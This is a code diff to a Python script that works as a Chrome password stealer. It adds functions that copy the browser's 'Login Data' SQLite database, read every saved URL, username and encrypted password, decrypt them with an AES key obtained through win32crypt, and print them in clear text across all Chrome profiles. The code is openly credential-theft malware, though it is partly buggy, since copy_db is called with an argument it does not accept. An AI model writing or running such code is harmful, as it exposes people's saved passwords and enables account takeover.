@@ -5,7 +5,7 @@ import win32crypt
 from Crypto.Cipher import AES
 import ctypes
 import shutil
-
+import sqlite3
 
 
 
@@ -30,5 +30,75 @@ def get_aes():
 
 
 
+
+#print(f"AES Key: {key.hex()}")
+
+
+def copy_db():
+    db_path = os.path.join(os.environ["LOCALAPPDATA"],"Google","Chrome","User Data","Profile 2","Login Data")
+
+    temp_path = "dbcopy.db"
+    shutil.copy(db_path, temp_path)
+
+    return temp_path
+
+
+
+
+
+def read_db(db_file):
+    connect = sqlite3.connect(db_file)
+    cursor =  connect.cursor()
+
+    cursor.execute(" SELECT origin_url, username_value, password_value FROM logins")
+
+    rows = cursor.fetchall()
+    connect.close()
+
+    return rows
+
+
+def decrypt_passes(encrypted_password, key):
+    try:
+        if encrypted_password.startswith(b'v10'):
+            iv = encrypted_password[3:15]
+            payload=encrypted_password[15:]
+            cipher = AES.new(key , AES.MODE_GCM , iv)
+            decrypted_pass = cipher.decrypt(payload)[:-16]
+
+
+            return decrypted_pass.decode()
+        
+    except:
+        return "[Dedcryption Fauiled]"
+    
+
+
+def extract_passwords_from_profiles():
+    user_data_path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data")
+    key = get_aes()
+    for folder in os.listdir(user_data_path):
+        profile_path = os.path.join(user_data_path, folder)
+        db_path = os.path.join(profile_path, "Login Data")
+        if folder.startswith("Profile") and os.path.isfile(db_path):
+            print(f"\nExtracting from: {folder}\n{'='*40}")
+            db_file = copy_db(db_path)
+            entries = read_db(db_file)
+            for origin_url, username_value, password_value in entries:
+                dec_pass = decrypt_passes(password_value, key)
+                if username_value or dec_pass:
+                    print(f"URL: {origin_url}\nUsername: {username_value}\nPassword: {dec_pass}\n{'-'*30}")
+            os.remove(db_file)
+
+
+
+
 key = get_aes()
-print(f"AES Key: {key.hex()}")
+db_file = copy_db()
+entries = read_db(db_file)
+
+
+for origin_url, username_value, password_value in entries:
+    dec_pass = decrypt_passes(password_value, key)
+    if username_value or dec_pass:
+        print(f"URL: {origin_url}\nUsername: {username_value}\nPassword: {dec_pass}\n{'-'*30}")
